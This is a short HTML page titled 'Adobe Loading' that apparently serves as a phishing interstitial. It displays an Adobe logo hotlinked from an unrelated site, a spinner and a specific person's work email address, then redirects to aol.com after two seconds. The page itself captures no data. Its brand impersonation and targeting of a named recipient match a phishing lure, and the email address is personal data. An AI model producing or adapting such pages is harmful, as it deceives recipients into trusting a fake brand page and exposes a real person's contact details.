<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Adobe Loading</title>
    <style>
        body {
            background-color: rgb(100, 12, 12);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: Arial, sans-serif;
        }
        .container {
            background-color: white;
            padding: 30px;
            border-radius: 15px 15px 15px 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.2);
        }
        .logo {
            width: 100px;
        }
        .loader {
            border: 6px solid rgba(0, 0, 0, 0.1);
            border-top: 6px solid red;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin-top: 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .email {
            margin-top: 20px;
            font-size: 18px;
            font-weight: bold;
            color: black;
        }
    </style>
    <script>
        // Redirect to the specified URL after 2 seconds
        setTimeout(function() {
            window.location.href = 'https://aol.com'; 
        }, 2000);
    </script>
</head>
<body>
    <div class="container">
        <img src="https://www.tech-advising.com/wp-content/uploads/adobe-logo.png" class="logo" alt="Adobe Logo">
        <div class="loader"></div>
        <div class="email">MDitonto@thebridgesrsf.com</div>
    </div>
</body>
</html>
